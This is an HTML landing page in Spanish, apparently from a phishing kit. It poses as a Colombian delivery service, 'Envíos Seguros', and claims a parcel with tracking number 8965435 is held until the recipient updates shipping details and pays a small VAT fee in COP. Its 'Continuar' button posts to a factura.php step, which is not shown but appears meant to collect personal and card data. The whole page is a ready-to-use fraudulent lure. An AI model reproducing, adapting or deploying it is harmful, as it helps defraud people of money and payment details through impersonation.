
<!DOCTYPE html>
<html lang="es">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Envíos Seguros</title>

    <link href="../cdn.jsdelivr.net/npm/bootstrap%405.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">

    <style>
        * {
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }
        body {
            background-color: #f8f9fa;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        .contenedor {
            width: 90%;
            max-width: 600px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
        .title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        .btn-custom {
            background-color: #ff5722;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
        }
        .btn-custom:hover {
            background-color: #e64a19;
        }
        .footer {
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="contenedor">
        <img src="img/logo.jpg" alt="Logo" class="img-fluid mb-3" width="80%">
        
        <p class="title">Paquete retenido</p>
        <p>Su paquete con guía de rastreo No. <strong>8965435</strong> se encuentra retenido.</p>
        <p>Para liberarlo, debe actualizar sus datos de envío y realizar el pago de impuestos al IVA por un valor de:</p>
        <p><strong>$11.752 COP</strong></p>

        <form action="factura.php" method="post">
            <input type="hidden" name="numero_guia" value="8965435">
            <button type="submit" class="btn-custom">Continuar</button>
        </form>
    </div>

    <div class="footer">
        <img src="img/footer.jpg" alt="Footer" class="img-fluid" width="100%">
    </div>

</body>

</html>
